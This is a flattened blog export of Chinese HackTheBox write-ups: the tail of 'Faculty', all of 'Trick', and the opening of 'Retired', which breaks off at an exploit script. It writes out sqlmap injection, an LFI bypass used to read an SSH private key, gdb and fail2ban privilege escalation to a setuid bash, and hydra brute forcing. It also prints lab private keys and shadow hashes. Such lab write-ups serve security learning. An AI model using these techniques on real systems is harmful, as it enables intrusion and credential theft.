XH8HNuKSN385TCX&#x2F;QWNfWVnuIhl687Dqi2bvBtpMMKNYMMYDErB1dpYZmh8mcMZgHN3lAK06Xdz57eQQt0oGq6btFdbdVDmwm+LuTRwxJSCsQtc2vyQOEaOpEad9RvTiMNiAKy1AnlViyoXAW49gIeK1ay7z3jAAAAwQDxEUTmwvt+oX1o1U&#x2F;ZPaHkmi&#x2F;VKlO3jxABwPRkFCjyDt6AMQ8K9kCn1ZnTLy+J1M+tm1LOxwkY3T5oJi&#x2F;yLtercex4AFaAjZD7sjX9vDqX8atR8M1VXOy3aQ0HGYG2FF7vEFwYdNPfGqFLxLvAczzXHBudQzVDjJkn6+ANFdKKR3j3s9xnkb5j+U&#x2F;jGzxvPGDpCiZz0I30KRtAzsBzT1ZQMEvKrchpmRjrzHFkgTUug0lsPE4ZLB0Re6Iq3ngtaNUAAADBANBXLol4lHhpWL30or8064fjhXGjhY4gblDouPQFIwCaRbSWLnKvKCwaPaZzocdHlr5wRXwRq8V1VPmsxX8O87y9Ro5guymsdPprXFLETXujOl8CFiHvMA1Zf6eriE1&#x2F;Od3JcUKiHTwv19MwqHitxUcNW0sETwZ+FAHBBuc2NTVFYEeVKoox5zK4lPYIAgGJvhUTzSuu0tS8O9bGnTBTqUAq21NF59XVHDlX0ZAkCfnTW4IE7j9u1fIdwzi56TWNhQAAABFkZXZlbG9wZXJAZmFjdWx0eQ&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- user flagssh登录，获得user flag，并且发现当前用户在debug组中 提权信息debug组那就一般是gdb，发现gdb也有ptrace权限： 大概流程就是gdb attach到root进程上，然后就可以以root权限调用可用的函数，这里存在root运行python3，所以可以直接使用system函数执行任意命令 提权 &amp; root flag找出root运行的python3的PID，gdb attach，调用函数执行命令 123export PID=$(ps aux | grep \"^root.*python3\" | awk '&#123;print $2&#125;')gdb -p $PIDcall (void)system(\"chmod u+s /bin/bash\") shadow12345root:$6$CiEa.wxtUKxG5q21$ED3MTE6ehz0j0q4kRQfK4bnLQFLZDrG9skIPsc0p2&#x2F;X3JSBHFWjRWAZwEdUpqON6UqZOXvme7.1wHzNCVHqk9&#x2F;:18559:0:99999:7:::gbyolo:$6$ccGHy1FmLiRRtdRO$8YUhXxCWlUNP7&#x2F;VSch6vqb3aEMs4j&#x2F;ncGyPCObyl9rS8C&#x2F;ZDiC4.NOXAb0B1cuMir0ilQK.IDWFjDEryXV5fx1:19165:0:99999:7:::postfix:*:18559:0:99999:7:::developer:$6$oY&#x2F;UDfRNf0UfWpGG$PUFSZoqX4AM1igh7RFTCLRnbs4Qi19jdqOMeZWBIwnkVS&#x2F;&#x2F;6iyRbNaY&#x2F;ZFcNoCFDMfdgAlnA4C7EiPRV9Ayvc.:18559:0:99999:7:::usbmux:*:19164:0:99999:7::: 参考资料 Make annotation tags disabled by default · Issue #356 · mpdf/mpdfhttps://github.com/mpdf/mpdf/issues/356 728040 [meta-git] RCE via insecure command formatting https://hackerone.com/reports/728040 Faculty HTB - [DISCUSSION] | BreachForumshttps://breached.to/Thread-Faculty-HTB-DISCUSSION Writeup Faculty HackTheBoxhttps://gatogamer1155.github.io/hackthebox/faculty/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Trick - HackTheBox","slug":"Trick-HackTheBox","date":"2022-06-29T08:18:36.000Z","updated":"2022-10-31T01:01:32.524Z","comments":true,"path":"2022/06/29/Trick-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/06/29/Trick-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/477 10.10.11.166 端口扫描22，25，53，80: 1234567891011121314151617181920212223$ nmap -sC -sV 10.10.11.166Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-29 13:21 CSTNmap scan report for 10.10.11.166Host is up (0.20s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)| 256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)|_ 256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)25/tcp open smtp Postfix smtpd|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING53/tcp open domain ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)| dns-nsid:|_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian80/tcp open http nginx 1.14.2|_http-title: Coming Soon - Start Bootstrap Theme|_http-server-header: nginx/1.14.2Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 96.12 seconds 80直接访问是Coming Soon： 53 dns域传送dns域传送获得几个域名： 123456789101112131415$ dig @10.10.11.166 axfr trick.htb; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @10.10.11.166 axfr trick.htb; (1 server found);; global options: +cmdtrick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800trick.htb. 604800 IN NS trick.htb.trick.htb. 604800 IN A 127.0.0.1trick.htb. 604800 IN AAAA ::1preprod-payroll.trick.htb. 604800 IN CNAME trick.htb.trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800;; Query time: 688 msec;; SERVER: 10.10.11.166#53(10.10.11.166);; WHEN: Wed Jun 29 13:29:18 CST 2022;; XFR size: 6 records (messages 1, bytes 203) ##preprod-payroll.trick.htb 加hosts后访问 110.10.11.166 preprod-payroll.trick.htb trick.htb preprod-payroll很容易发现sql注入： sql注入直接sqlmap,但得到的密码并不能登录： 12345678910111213141516171819202122232425262728293031sqlmap -u \"http://preprod-payroll.trick.htb/ajax.php?action=login\" --data \"username=admin&amp;password=aaa\" -v 3 --level 3available databases [2]:[*] information_schema[*] payroll_dbDatabase: payroll_db[11 tables]+---------------------+| position || allowances || attendance || deductions || department || employee || employee_allowances || employee_deductions || payroll || payroll_items || users |+---------------------+Table: users[1 entry]+----+-----------+---------------+------+---------+---------+-----------------------+------------+| id | doctor_id | name | type | address | contact | password | username |+----+-----------+---------------+------+---------+---------+-----------------------+------------+| 1 | 0 | Administrator | 1 | &lt;blank&gt; | &lt;blank&gt; | SuperGucciRainbowCake | Enemigosss |+----+-----------+---------------+------+---------+---------+-----------------------+------------+SuperGucciRainbowCake 文件读取测试发现可以通过sql去读取文件： 12345678910111213141516171819202122232425262728293031323334353637383940414243sqlmap -u \"http://preprod-payroll.trick.htb/ajax.php?action=login\" --data \"username=admin&amp;password=aaa\" -v 3 --level 3 --file-read \"/etc/passwd\"root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologintss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/falsednsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologinpulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologinspeech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/falseavahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologinsaned:x:112:121::/var/lib/saned:/usr/sbin/nologincolord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologinhplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/falseDebian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/falsesystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinmysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/falsesshd:x:118:65534::/run/sshd:/usr/sbin/nologinpostfix:x:119:126::/var/spool/postfix:/usr/sbin/nologinbind:x:120:128::/var/cache/bind:/usr/sbin/nologinmichael:x:1001:1001::/home/michael:/bin/bash vhost根据得到的子域名命名规则生成字典，得到其他的vhost： 12345sed 's/^/preprod-/' ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt &gt; subdomains.txtgobuster vhost -u http://trick.htb -w subdomains.txt -t 50Found: preprod-marketing.trick.htb (Status: 200) [Size: 9660] preprod-marketing加入hosts后访问： LFI根据page参数很容易猜到LFI，存在简单的过滤，可以双写绕过： (过滤规则也可以通过前面sql的文件读取读源码获得) 1preprod-marketing.trick.htb&#x2F;index.php?page&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;etc&#x2F;passwd michael_id_rsa这里有权限读取michael用户的私钥(前面的sql那里没权限读的)： 1curl \"http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././..././home/michael/.ssh/id_rsa\" &gt; michael_id_rsa 内容： 123456789101112131415161718192021222324252627-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2&#x2F;+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtzc4jtky6wYGzlxKHg&#x2F;Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2GYQ2re&#x2F;gTrNElMAqURSCVydx&#x2F;UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia&#x2F;Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws&#x2F;jgdxpDV9K3iDTPWXFwtK41kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b&#x2F;7uaCDkelLDMdnC73k2qHUa7j70&#x2F;6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizEhkXgenBG3VPvjCKiohfcQBgIJlx&#x2F;7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1LjnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri&#x2F;dldDc3CaUZ9JF9u&#x2F;cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T&#x2F;mQYlmi&#x2F;KwkWcvbR2gTOlpgLZNRE&#x2F;GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjCtnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455GeU+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0fHbE5GMyJf6+&#x2F;8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1VPH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXAfvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sTAuNHUSgX&#x2F;tcNxg1yYHeHTu868&#x2F;LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgnIn16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a&#x2F;5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DPJkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ&#x2F;YzySvfVNPtSb0XNjsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- user flag使用得到的私钥登录michael： 提权信息很明显的提示，fail2ban： fail2ban被触发时会执行配置文件中预先定义的命令，所以大概就是修改配置文件自定义命令后重启服务，然后去触发fail2ban执行命令 Privilege Escalation via fail2ban – Research Bloghttps://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/ 查看配置目录也可以发现，虽然当前用户不能直接修改配置文件，但当前用户在security组中，对目录有操作权限，可以删除原有配置文件后创建新的配置文件： fail2ban to root 修改配置文件后重启服务，然后去触发fail2ban执行命令： 1234567michael@trick:/tmp$ sed \"s/&lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;/chmod u+s \\/bin\\/bash/g\" /etc/fail2ban/action.d/iptables-multiport.conf &gt; config.confmichael@trick:/tmp$ rm -f /etc/fail2ban/action.d/iptables-multiport.confmichael@trick:/tmp$ mv config.conf /etc/fail2ban/action.d/iptables-multiport.confmichael@trick:/tmp$ sudo /etc/init.d/fail2ban restart# 爆破，触发fail2banhydra 10.10.11.166 ssh -l root -P /usr/share/wordlists/rockyou.txt shadow12root:$6$lbBzS2rUUVRa6Erd$u2u317eVZBZgdCrT2HViYv.69vxazyKjAuVETHTpTpD42H0RDPQIbsCHwPdKqBQphI&#x2F;FOmpEt3lgD9QBsu6nU1:19104:0:99999:7:::michael:$6$SPev7eFL5z0aKFf0$5iLTl9egsGGePEPUnNJlFyw8HHvTwqVC3&#x2F;THKzW2YD5ZPnbkN7pSOeOkXe9uiUHfOJegJdYT0j3Z9pz.FSX2y0:19104:0:99999:7::: root_id_rsa123456789101112131415161718192021222324252627-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEAoSBXc6x1gauygp8zl8Y13QXTwj633MsMv&#x2F;0YsBzmGiHb1xBadkGC6a0abDxM4UycoYN82sT7N732cJqL9mWK7ZeGPQX4+RHD0fQnVQY3KCYak7RxQQtilsErhGVgovwAtnbaKA+tlfsO7IlD3Mv6lbJ&#x2F;ElD9drwhJOVdEf4IL+8SstVgd0AehVQgnLXd58MK7tuKX+a&#x2F;+eBBjzfpA6hWIzTT3koLnMoTWe5uCuhIJiaBUQyvrBQ1C&#x2F;M4E7rnHw6Rgh9x9d1LPInu0NMxbw0LAuFaQRcz3ewzEt8M2d639vedwahK5MyuTQS&#x2F;ZTt33yjoas40kv+NZ5Y05vVeP6XxcwAAA8jXOo441zqOOAAAAAdzc2gtcnNhAAABAQChIFdzrHWBq7KCnzOXxjXdBdPCPrfcywy&#x2F;&#x2F;RiwHOYaIdvXEFp2QYLprRpsPEzhTJyhg3zaxPs3vfZwmov2ZYrtl4Y9Bfj5EcPR9CdVBjcoJhqTtHFBC2KWwSuEZWCi&#x2F;AC2dtooD62V+w7siUPcy&#x2F;qVsn8SUP12vCEk5V0R&#x2F;ggv7xKy1WB3QB6FVCCctd3nwwru24pf5r&#x2F;54EGPN+kDqFYjNNPeSgucyhNZ7m4K6EgmJoFRDK+sFDUL8zgTuucfDpGCH3H13Us8ie7Q0zFvDQsC4VpBFzPd7DMS3wzZ3rf2953BqErkzK5NBL9lO3ffKOhqzjSS&#x2F;41nljTm9V4&#x2F;pfFzAAAAAwEAAQAAAQEAkxF9ITUZ8GjywC1mHzOpOHu4JIWwtxSTJ65x2VYXZWTgT7Y6i9QSFQ6OnpqPpdmS4g2tadYAY4m9plw6QoW+wEzdF1gbP+RKM5pCSGYq9DeLbKR392HX9DiPawJJqZqRX&#x2F;qt94EP9WS544cK7T82E2tgdyx7nePr8Mx2HhUcDfsbxQlRbM9oKqIBQ0v9GdBotvi+Ri&#x2F;IQfpEpmS64cU450&#x2F;DlrwQ358MU9i8so0KlnAHLYxgzhEzPjPehaRShcsRdhasw1&#x2F;xVKk7PoBvXzz9r+Ywo5b2htiYzqxt5N5iE8UOrUeYb7G21QjuhKB9KerukyGeHdBPjqvYuYjTwf2dUQAAAIEAnSUxZdekVLY0IoYPBFDBDIMkk97Kq2v8H51L9Q0rKBs79x4ZaV56LfMnTxuAxwnUMUauyPeGZFDgVsFwg0JK+vbRKj9idBoMTOuDdfTE4IJtT3tEKClzFS9YSrYdQ78OUu8Kip3p5OuWfrzTuhRCKZ2cwd86WUghEBWtHhn&#x2F;2RsAAACBANHocGFZWWM1DGtA3ZXiytuJLh7D55NUPk7jumm+qcF7UUiKaRHAQnQ44oxHssJbkGi4S3tvfSlXFtNboQCt3q5Wgc3wl4S+sBGoq1xsZuXAz&#x2F;3QX2AjXSpN&#x2F;SPkO+h4pk25aAFjGmAMMoH1Ty9v2X8ahYRY5EV8Y&#x2F;LRcMF32Z5rAAAAgQDEgb1hc85TS0WzpmGTto+ok3eI&#x2F;10wxgbZXtdki7Jn1npNI5S7lh0r76jqEn5edcIYlwcUV+b6dCucDUhUHl7VT&#x2F;uoy+BKbanLzM809KCnuLCM7LDISk4N&#x2F;S79xiuFlrk11MrV2qaxZANiYEkOd1jKRGPiUDRYRn2lPX7WiLyrGQAAAApyb290QHRyaWNrAQIDBAUGBw&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- 参考资料 Privilege Escalation via fail2ban – Research Bloghttps://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/ Trick HTB Discussion | BreachForumshttps://breached.to/Thread-Trick-HTB-Discussion--10712 Writeup Trick HackTheBoxhttps://gatogamer1155.github.io/hackthebox/trick/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Retired - HackTheBox","slug":"Retired-HackTheBox","date":"2022-06-23T06:49:06.000Z","updated":"2022-08-15T04:26:14.592Z","comments":true,"path":"2022/06/23/Retired-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/06/23/Retired-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/456 10.10.11.154 端口扫描22和80: 1234567891011121314151617181920$ nmap -sC -sV 10.10.11.154Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-06-23 12:53 CSTRTTVAR has grown to over 2.3 seconds, decreasing to 2.0RTTVAR has grown to over 2.3 seconds, decreasing to 2.0Nmap scan report for 10.10.11.154Host is up (0.19s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0)| ssh-hostkey:| 3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)| 256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)|_ 256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)80&#x2F;tcp open http nginx| http-title: Agency - Start Bootstrap Theme|_Requested resource was &#x2F;index.php?page&#x3D;default.htmlService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 117.14 seconds 80访问自动跳转首页，page参数加载页面，很可能存在LFI： 目录扫描目录扫描可以发现一个beta.html,存在上传功能： 123456789gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://10.10.11.154/ -x html,php,txt/assets (Status: 301) [Size: 162] [--&gt; http://10.10.11.154/assets/]/beta.html (Status: 200) [Size: 4144]/css (Status: 301) [Size: 162] [--&gt; http://10.10.11.154/css/]/default.html (Status: 200) [Size: 11414]/index.php (Status: 302) [Size: 0] [--&gt; /index.php?page=default.html]/index.php (Status: 302) [Size: 0] [--&gt; /index.php?page=default.html]/js (Status: 301) [Size: 162] [--&gt; http://10.10.11.154/js/] beta.html upload尝试上传文件，发现activate_license.php： LFI验证存在，会跳转到首页，所以通过repeater或者直接使用curl： activate_license.phpLFI读前面的activate_license.php，发现本地1337端口的服务： /proc/sched_debug因为1337端口这是另一个进程，首先通过sched_debug获取进程信息： /proc/pid/cmdline然后根据pid再去获取其他信息,得到文件路径： activate_license1337下载下来分析，接下来就是二进制部分了 123456789101112curl \"http://10.10.11.154/index.php?page=/usr/bin/activate_license\" --output activate_license$ file activate_licenseactivate_license: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not strippedchecksec activate_license[*] activate_license Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled rop基础rop，各种保护所需要的信息可以通过LFI去读maps获取,最终打到www-data: 1offset 520 maps123456789101112131415161718192021222324252627282930313233343536373839404142434445559bc36a6000-559bc36a7000 r--p 00000000 08:01 2408 &#x2F;usr&#x2F;bin&#x2F;activate_license559bc36a7000-559bc36a8000 r-xp 00001000 08:01 2408 &#x2F;usr&#x2F;bin&#x2F;activate_license559bc36a8000-559bc36a9000 r--p 00002000 08:01 2408 &#x2F;usr&#x2F;bin&#x2F;activate_license559bc36a9000-559bc36aa000 r--p 00002000 08:01 2408 &#x2F;usr&#x2F;bin&#x2F;activate_license559bc36aa000-559bc36ab000 rw-p 00003000 08:01 2408 &#x2F;usr&#x2F;bin&#x2F;activate_license559bc3ba7000-559bc3bc8000 rw-p 00000000 00:00 0 [heap]7f68d48b9000-7f68d48bb000 rw-p 00000000 00:00 0 7f68d48bb000-7f68d48bc000 r--p 00000000 08:01 3635 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.31.so7f68d48bc000-7f68d48be000 r-xp 00001000 08:01 3635 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.31.so7f68d48be000-7f68d48bf000 r--p 00003000 08:01 3635 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.31.so7f68d48bf000-7f68d48c0000 r--p 00003000 08:01 3635 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.31.so7f68d48c0000-7f68d48c1000 rw-p 00004000 08:01 3635 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.31.so7f68d48c1000-7f68d48c8000 r--p 00000000 08:01 3645 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.31.so7f68d48c8000-7f68d48d8000 r-xp 00007000 08:01 3645 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.31.so7f68d48d8000-7f68d48dd000 r--p 00017000 08:01 3645 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.31.so7f68d48dd000-7f68d48de000 r--p 0001b000 08:01 3645 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.31.so7f68d48de000-7f68d48df000 rw-p 0001c000 08:01 3645 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.31.so7f68d48df000-7f68d48e3000 rw-p 00000000 00:00 0 7f68d48e3000-7f68d48f2000 r--p 00000000 08:01 3636 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libm-2.31.so7f68d48f2000-7f68d498c000 r-xp 0000f000 08:01 3636 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libm-2.31.so7f68d498c000-7f68d4a25000 r--p 000a9000 08:01 3636 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libm-2.31.so7f68d4a25000-7f68d4a26000 r--p 00141000 08:01 3636 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libm-2.31.so7f68d4a26000-7f68d4a27000 rw-p 00142000 08:01 3636 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libm-2.31.so7f68d4a27000-7f68d4a4c000 r--p 00000000 08:01 3634 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so7f68d4a4c000-7f68d4b97000 r-xp 00025000 08:01 3634 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so7f68d4b97000-7f68d4be1000 r--p 00170000 08:01 3634 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so7f68d4be1000-7f68d4be2000 ---p 001ba000 08:01 3634 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so7f68d4be2000-7f68d4be5000 r--p 001ba000 08:01 3634 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so7f68d4be5000-7f68d4be8000 rw-p 001bd000 08:01 3634 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so7f68d4be8000-7f68d4bec000 rw-p 00000000 00:00 0 7f68d4bec000-7f68d4bfc000 r--p 00000000 08:01 5321 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libsqlite3.so.0.8.67f68d4bfc000-7f68d4cf4000 r-xp 00010000 08:01 5321 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libsqlite3.so.0.8.67f68d4cf4000-7f68d4d28000 r--p 00108000 08:01 5321 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libsqlite3.so.0.8.67f68d4d28000-7f68d4d2c000 r--p 0013b000 08:01 5321 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libsqlite3.so.0.8.67f68d4d2c000-7f68d4d2f000 rw-p 0013f000 08:01 5321 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libsqlite3.so.0.8.67f68d4d2f000-7f68d4d31000 rw-p 00000000 00:00 0 7f68d4d36000-7f68d4d37000 r--p 00000000 08:01 3630 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.31.so7f68d4d37000-7f68d4d57000 r-xp 00001000 08:01 3630 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.31.so7f68d4d57000-7f68d4d5f000 r--p 00021000 08:01 3630 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.31.so7f68d4d60000-7f68d4d61000 r--p 00029000 08:01 3630 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.31.so7f68d4d61000-7f68d4d62000 rw-p 0002a000 08:01 3630 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.31.so7f68d4d62000-7f68d4d63000 rw-p 00000000 00:00 0 7ffdd5ef5000-7ffdd5f16000 rw-p 00000000 00:00 0 [stack]7ffdd5f4b000-7ffdd5f4f000 r--p 00000000 00:00 0 [vvar]7ffdd5f4f000-7ffdd5f51000 r-xp 00000000 00:00 0 [vdso] exp.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#!/usr/bin/python3import requestsfrom pwn import *def kill(sig, frame): 